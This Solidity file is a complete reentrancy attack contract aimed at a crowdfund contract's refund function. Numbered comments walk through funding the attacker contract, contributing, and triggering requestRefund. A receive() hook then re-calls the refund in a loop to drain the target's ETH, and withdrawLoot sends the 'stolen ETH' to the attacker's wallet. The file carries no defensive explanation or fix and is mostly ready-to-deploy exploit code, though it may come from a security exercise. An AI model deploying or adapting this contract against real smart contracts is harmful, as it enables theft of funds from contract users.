// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;


interface ICrowdfundVulnerable {
    function contribute() external payable;
    function requestRefund() external;
    function contributions(address user) external view returns (uint256);
}

contract RefundAttacker {
    
    address payable public attacker;

    
    
    uint256 public lastContributionAmount;

    modifier onlyAttacker() {
        require(msg.sender == attacker, "Not attacker");
        _;
    }

    constructor() {
        attacker = payable(msg.sender);
        
    }

    // STEP 1: EOA sends ETH into attacker contract
    function fundAttacker() external payable onlyAttacker {}

    // STEP 2: Contribute attacker contract balance into the crowdfund
    function contributeFromContract(
        address targetCrowdfund,
        uint256 amount
    ) external onlyAttacker {
        require(amount > 0, "Amount required");
        require(address(this).balance >= amount, "Insufficient attacker balance");
        require(targetCrowdfund != address(0), "Target required");

        lastContributionAmount = amount;
        ICrowdfundVulnerable(targetCrowdfund).contribute{value: amount}();
    }

    // STEP 3: Trigger reentrancy (no ETH should be forwarded)
    function runAttack(address targetCrowdfund, uint256 amount) external onlyAttacker {
        require(amount > 0, "Amount required");
        require(amount == lastContributionAmount, "Amount must match contribution");
        require(targetCrowdfund != address(0), "Target required");

        ICrowdfundVulnerable target = ICrowdfundVulnerable(targetCrowdfund);
        require(target.contributions(address(this)) >= amount, "Crowdfund contribution missing");
        target.requestRefund();
    }

    // STEP 4: Reentrancy loop – called when vulnerable sends ETH back
    receive() external payable {
        if (address(msg.sender).balance >= lastContributionAmount && lastContributionAmount > 0) {
            ICrowdfundVulnerable(msg.sender).requestRefund();
        }
    }

    // STEP 5: Withdraw stolen ETH from attacker contract to attacker EOA
    function withdrawLoot() external onlyAttacker {
        uint256 bal = address(this).balance;
        require(bal > 0, "No loot");
        attacker.transfer(bal);
    }
}
